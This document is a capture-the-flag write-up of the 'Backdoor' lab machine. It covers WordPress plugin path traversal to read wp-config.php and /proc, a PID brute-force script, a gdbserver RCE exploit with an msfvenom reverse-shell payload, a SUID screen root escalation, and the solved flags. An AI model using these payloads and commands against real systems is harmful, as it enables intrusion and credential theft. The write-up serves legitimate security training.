# Backdoor

### Content

-   WordPress Local File Inclusion Vulnerability (LFI)
-   LFI to RCE (Abusing /proc/PID/cmdline)
-   Gdbserver RCE Vulnerability
-   Abusing Screen (Privilege Escalation) [Session synchronization]

### Reconnaissance

```bash
nmap -sS -p- --open --min-rate 5000 -Pn -n 10.10.11.125 -vvv -oN allPorts
passwd: 
Starting Nmap 7.92 ( <https://nmap.org> ) at 2022-07-11 22:23 CDT
Initiating SYN Stealth Scan at 22:23
Scanning 10.10.11.125 [65535 ports]
Discovered open port 80/tcp on 10.10.11.125
Discovered open port 22/tcp on 10.10.11.125
Discovered open port 1337/tcp on 10.10.11.125
Completed SYN Stealth Scan at 22:23, 17.63s elapsed (65535 total ports)
Nmap scan report for 10.10.11.125
Host is up, received user-set (0.26s latency).
Scanned at 2022-07-11 22:23:40 CDT for 18s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
1337/tcp open  waste   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.96 seconds
           Raw packets sent: 85762 (3.774MB) | Rcvd: 85068 (3.403MB)
```

Deeper enumeration to see services and its versions:

```bash
nmap -sCV -p22,80,1337 -vvv -Pn -n -oN targeted 10.10.11.125
Nmap scan report for 10.10.11.125
Host is up, received user-set (0.098s latency).
Scanned at 2022-04-23 01:36:24 CDT for 38s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqz2EAb2SBSzEIxcu+9dzgUZzDJGdCFWjwuxjhwtpq3sGiUQ1jgwf7h5BE+AlYhSX0oqoOLPKA/QHLxvJ9sYz0ijBL7aEJU8tYHchYMCMu0e8a71p3UGirTjn2tBVe3RSCo/XRQOM/ztrBzlqlKHcqMpttqJHphVA0/1dP7uoLCJlAOOWnW0K311DXkxfOiKRc2izbgfgimMDR4T1C17/oh9355TBgGGg2F7AooUpdtsahsiFItCRkvVB1G7DQiGqRTWsFaKBkHPVMQFaLEm5DK9H7PRwE+UYCah/Wp95NkwWj3u3H93p4V2y0Y6kdjF/L+BRmB44XZXm2Vu7BN0ouuT1SP3zu8YUe3FHshFIml7Ac/8zL1twLpnQ9Hv8KXnNKPoHgrU+sh35cd0JbCqyPFG5yziL8smr7Q4z9/XeATKzL4bcjG87sGtZMtB8alQS7yFA6wmqyWqLFQ4rpi2S0CoslyQnighQSwNaWuBYXvOLi6AsgckJLS44L8LxU4J8=
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIuoNkiwwo7nM8ZE767bKSHJh+RbMsbItjTbVvKK4xKMfZFHzroaLEe9a2/P1D9h2M6khvPI74azqcqnI8SUJAk=
|   256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7eoJSCw4DyNNaFftGoFcX4Ttpwf+RPo0ydNk7yfqca
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Backdoor &#8211; Real-Life
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
1337/tcp open  waste?  syn-ack ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
# Nmap done at Sat Apr 23 01:37:02 2022 -- 1 IP address (1 host up) scanned in 38.67 seconds
```

We can identify a wordpress running on port 80 as we enumerate through the web page we can see that there is a section “Blog” if we go to the post in there, we are able to see that the user who create the post is “Admin”:

![[Pasted image 20220712112906.png]]

Also while enumerating WordPress we can check for interesting default paths like for example the web admin login page here we can try to enumerate users with the error banner: ^34b6a9

![[Pasted image 20220712112928.png]]

In comparison with a random user, we can see which users are and are not registered/creted for this web page:

![[Pasted image 20220712112943.png]]

Other than that we are not able to enumerate further users, so let’s skip this part for now and let’s keep enumerating wordpress, another interesting wordpress path to check is the plugins content path, if we have enumeration folder listing, we then should be able to see which plugins are inside: ^11157a

![[Pasted image 20220712112954.png]]
In this case, we can see ebook-download folder, by searching vulnerabilites with searchsploit we can found the following:

```bash
searchsploit ebook download
---------------------------------------------------------- -----------------------
 Exploit Title                                            |  Path
------------------------------------------------------ ---------------------------
WordPress Plugin eBook Download 1.1 - Directory Traversal | php/webapps/39575.txt
----------------------------------------------------------------------------------
```

By looking inside we can see that this is the payload being used, by using it within the web page we are able to download files from within the system:

![[Pasted image 20220712113009.png]]
Request:

```bash
<http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php>
```

### Exploitation

Within the file we found a DB username and password:

![[Pasted image 20220712113017.png]]
This credentials are not useful not for login as SSH user nor for admin from wp-admin login, another tip is to enumerate further the machine, just to check if something useful is within, like for example know if there is a docker within that we’ll need to escape after breaching it listing the content of /proc/net/fib_trie:

```bash
curl -s -X GET '<http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../..//proc/net/fib_trie>'
../../../../../../../..//proc/net/fib_trie../../../../../../../..//proc/net/fib_trie../../../../../../../..//proc/net/fib_trieMain:
  +-- 0.0.0.0/1 2 0 2
     +-- 0.0.0.0/4 2 0 2
        |-- 0.0.0.0
           /0 universe UNICAST
        +-- 10.10.10.0/23 2 0 1
           |-- 10.10.10.0
              /32 link BROADCAST
              /23 link UNICAST
           |-- **10.10.11.125**
              /32 host LOCAL
           |-- 10.10.11.255
              /32 link BROADCAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
Local:
  +-- 0.0.0.0/1 2 0 2
     +-- 0.0.0.0/4 2 0 2
        |-- 0.0.0.0
           /0 universe UNICAST
        +-- 10.10.10.0/23 2 0 1
           |-- 10.10.10.0
              /32 link BROADCAST
              /23 link UNICAST
           |-- **10.10.11.125**
              /32 host LOCAL
           |-- 10.10.11.255
              /32 link BROADCAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
<script>window.close()</script>%
```

An interesting approach is by listing the /proc/id/cmdline within the system, this path according with redhat description:

This file shows the parameters passed to the kernel at the time it is started. A sample /proc/cmdline file looks like the following:

```bash
ro root=/dev/VolGroup00/LogVol00 rhgb quiet 3
```

But as we don’t have the exact number of the whole PID we then proceed to enumerate with following python script: ^4e1616

```python
#!/usr/bin/python3

from pwn import *

import requests, signal, time, sys, pdb

def def_handler(sig, frame):

	print("\\n\\n[!]Saliendo...\\n")
	sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url="<http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=>"

def makeRequest():

	#/proc/<id>/cmdline
	
	p1 = log.progress("Brute Force Attack")
	p1.status("Starting brute force attack")

	time.sleep(2)

	for i in range(1, 1000):

		p1.status("Trying with PATH /proc/%s/cmdline" % str(i))
#		log.info("Trying with PATH /proc/%s/cmdline" % str(i))

		url = main_url + "/proc/" + str(i) + "/cmdline"
		
		r = requests.get(url)

		if len(r.content) > 82:
			print("---------------------------------------------------")
			log.info("PATH: /proc/%s/cmdline" % str(i))
			log.info("Total lenght: %s" % len(r.content))
			print(r.content)
			print("---------------------------------------------------")

if __name__ == '__main__':

	makeRequest()
```

This will retrieve the information of those services and the cmdline command that were executed at the time it started, one specially that gives us a hint about what could be running on port tcp-1337:

```python
---------------------------------------------------
[*] PATH: /proc/816/cmdline
[*] Total lenght: 181
b'/proc/816/cmdline/proc/816/cmdline/proc/816/cmdline/bin/sh\\x00-c\\x00while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done\\x00<script>window.close()</script>'
---------------------------------------------------
```

Now that we know that there is a gdbserver running, we proceed to search for exploits for this service and we found the following: ^5d3296

```python
searchsploit gdbserver
----------------------------- ---------------------------- -----------------------
 Exploit Title                                            |  Path
---------------------------------------------------------- -----------------------
GNU gdbserver 9.2 - Remote Command Execution (RCE)        | linux/remote/50539.py
---------------------------------------------------------- -----------------------
Shellcodes: No Results
Papers: No Results
```

After download and execute it, we have the following help menu:

```python
python3 gdbserver_rce.py

Usage: python3 gdbserver_rce.py <gdbserver-ip:port> <path-to-shellcode>

Example:
- Victim's gdbserver   ->  10.10.10.200:1337
- Attacker's listener  ->  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 gdbserver_rce.py 10.10.10.200:1337 rev.bin
```

We proceed to create the msfvenom payload:

```python
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.4 LPORT=4444 PrependFork=true -o rev.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Saved as: rev.bin
```

Then by running the previous command we get access to the system:

```python
sudo python3 gdbserver_rce.py 10.10.11.125:1337 rev.bin
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener
```

#### Privilege Escalation

Get SUID by running following command: ^378c24

```python
find / \\-perm \\-4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/su
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/screen
/usr/bin/umount
/usr/bin/mount
/usr/bin/chsh
/usr/bin/pkexec
```

As we can see there is a SUID called screen, then we can search for a process running under the same name, to check if whether or not is being executed:

```python
ps -aux | grep screen
root  815  0.0  0.0   2608  1844 ? Ss 03:15 0:06 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \\;; done
```

Then we proceed to inspect the screen parameters being executed, this through the screen manual:

```python
man screen:

	-d|-D [pid.tty.host]
            does  not  start screen, but detaches the elsewhere running screen
            session. It has the same effect as typing "C-a  d"  from  screen's
            controlling  terminal.  -D  is  the equivalent to the power detach
            key.  If no session can be detached, this option  is  ignored.  In
            combination  with  the  -r/-R  option more powerful effects can be
            achieved:
	-D -m     This also starts screen in "detached" mode, but doesn't fork  a
            new process. The command exits if the session terminates. to  a
            specific  window or you want to send a command via the "-X" option
	-S sessionname
            When  creating a new session, this option can be used to specify a
            meaningful name for the session. This name identifies the  session
            for "screen -list" and "screen -r" actions. It substitutes the de‐
            fault [tty.host] suffix.
```

With this in mind, we can now reattach the session, and as it seems to be running as root, then we can read the manual to do so:

```python
-r [pid.tty.host]
       -r sessionowner/[pid.tty.host]
            resumes  a detached screen session.  No other options (except com‐
            binations with -d/-D) may be specified, though an optional  prefix
            of  [pid.]tty.host  may  be needed to distinguish between multiple
            detached screen sessions.  The second form is used to  connect  to
            another  user's  screen session which runs in multiuser mode. This
            sion exists, starts a new session  using  the  specified  options,
            just as if -R had not been specified. The option is set by default
            if screen is run as a login-shell (actually screen uses "-xRR"  in
            that  case).   For  combinations  with the -d/-D option see there.
            Note: Time-based session selection is a Debian addition.
```

So, the last command to escalate privileges is: ^48dab1

```python
screen -r root/
```

# Flags

user.txt

2f26235215ddd4101b12ad942403ccf7

root.txt

806de31eca10ba9b25b324266e5b690c